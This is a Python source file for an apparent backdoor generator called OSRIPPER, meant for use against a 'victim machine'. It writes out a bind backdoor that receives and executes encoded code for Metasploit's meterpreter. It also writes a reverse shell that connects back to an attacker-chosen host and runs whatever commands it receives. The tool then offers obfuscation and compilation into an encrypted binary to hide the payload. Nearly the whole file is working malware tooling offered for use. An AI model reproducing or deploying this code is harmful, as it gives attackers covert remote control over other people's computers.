import os
from pickle import GLOBAL
logo = """

░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓███████████████████████▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█████████████████████████████████▓▒░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████▒░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████████▒░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░▓██████████████████████████████████████████████████▒░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▓░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░▓███████████████████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░                                             
░░░░░░░░░░░░░░░▒███████████████▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓███████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░█████████████▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓██████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▓███████████▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓███▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░███████████▓▒▒▒▒▓▓▓▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▒▒▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▒██████████▓▒▒▒█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓██▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░██████████▓▒▒▓██▓▓▓▓▒▒▒▒▒▒▒▓▓▒▒▓▒▓▓▓▓▓▓▓▒▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░██████████▒▒▓█▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
░░░░░░░░░░░░▒████████▓▓▒▒█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓████████▓▒▒█▓█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓█████████▓▓█░▓█▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▓▒▓▓▒▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓███████▓▒░▒▒▒▒▒▓█▓▓▓▓▓▓▓▒▒▒▒▒▓▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓██████▒░░▒▓▓▒▒▒▒▒▓▓█▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▒▒▓▓▓▒▒▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░██████░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▒▓▓▓▓▒▒▒▒▒▒▒▓▒▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒████▓░░░░░▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▓████▒░░░░░░▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓█████████▓▓▓▓▓▓▓▓█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒████░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▓▓▓████████▓▓▓▓▓██▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░▒███▓░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▒▓▓▒█▒▒▒▒▒▒▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▓▓▒▒█▒▓▓▒▒▒▓▓▓▒█▒▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▒▒▒░░░░░░░░░░░░░░░░▒▓▓▒▒▒▓▓▒█▓▒▓▒▓▓▓░░░▓███▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▒▒░░░███▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▒▒▒▓▓▒░░░░██▓█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▓▓▓░░░░░█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▓▓▓░░░░░█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▒▒░░░░▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒░░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                                                           OSRIPPER v0.1.1
"""

clear = lambda: os.system('cls')
clear()
print(logo)
def gen_bind():
    global name
    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port))
        a = '''
import zlib,base64,socket,struct
b=socket.socket(2,socket.SOCK_STREAM)
b.bind(('0.0.0.0',int(port)))
b.listen(1)
s,a=b.accept()
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
                '''
        ina.write(a)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
def gen_rev():
    global name
    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    host = input('Please enter the ip you wish the backdoor to connect back to: ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port)+'\n')
        ina.write('hototo = "'+str(host)+'"')
        b = '''
    import socket as s
    import subprocess as r
    from time import sleep
    from urllib3 import Retry
    def main():
        so=s.socket(s.AF_INET,s.SOCK_STREAM)
        try:
            so.connect((hototo,port))
            while True:
                d=so.recv(1024)
                if len(d)==0:
                    break
                p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
                o=p.stdout.read()+p.stderr.read()
                so.send(o)
        except ConnectionRefusedError:
            sleep(5)
            main()
    main()        
                    '''
        ina.write(b)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('To open a listener you can run this command "ncat -lvnp '+port+'"')
def postgen():
    opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
    if opt_obf == 'y':
        
        import obfuscator
        obfuscator.MainMenu(name)
        encrypted = True
        compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
        if compiling == 'y':
            if encrypted == True:
                compcomd = 'pyinstaller -F --key sdkvksdbx=hk+b.axc132^ '+name+'_enc.py'
                os.system(compcomd)
                print('Saved under "dist" folder')
            else:
                compcomd = 'pyinstaller -F --key sdkvksdbx=hk+b.axc132^ '+name
                os.system(compcomd)
                os.system(clear)
                print(logo)
                print('Backdoor saved under "dist" folder')
print("""BackDoor Module
        
        1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
        2. Create Reverse Shell (TCP (Encryption not recommended)) (Connects back to you)
""")  
encrypted = False     
nscan = input("Please select a module: ")
if nscan == "1":
    gen_bind()
    postgen()
if nscan == "2":
    gen_rev()
    postgen()
